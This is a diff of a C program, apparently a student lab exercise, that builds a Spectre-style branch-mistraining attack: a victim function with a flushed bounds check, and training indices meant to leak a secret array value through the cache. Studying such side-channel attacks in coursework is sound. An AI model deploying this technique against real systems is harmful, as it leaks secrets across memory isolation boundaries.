@@ -7,7 +7,6 @@
 #define BUFF_SIZE (1 << 21)
 #define SHAREDMEMSETS 150
 #define THRESHOLD 120
-
 int bound = 20;
 //** Write your victim function here */
 // Assume secret_array[47] is your secret value
@@ -17,8 +16,9 @@ void victim(int volatile *secret_array, int *shared_mem, int volatile index)
 {
     int ninja;
     clflush(&bound);
-    if (index < bound)
+    if (index < bound){
         ninja = shared_mem[secret_array[index] * 64];
+    }
 }
 
 int main(int argc, char **argv)
@@ -54,7 +54,7 @@ int main(int argc, char **argv)
     //** STEP 2: Mistrain the branch predictor by calling victim function here */
     // To prevent any kind of patterns, ensure each time you train it a different number of times
 
-    int correctIndex = 15, incorrectIndex = 24;
+    int correctIndex = 15, incorrectIndex = 64;
 
     // Generate a random number between 40 and 50
     int train = rand() % 11 + 40; // rand() % 11 gives a number between 0 and 10, adding 40 shifts the range to 40-50
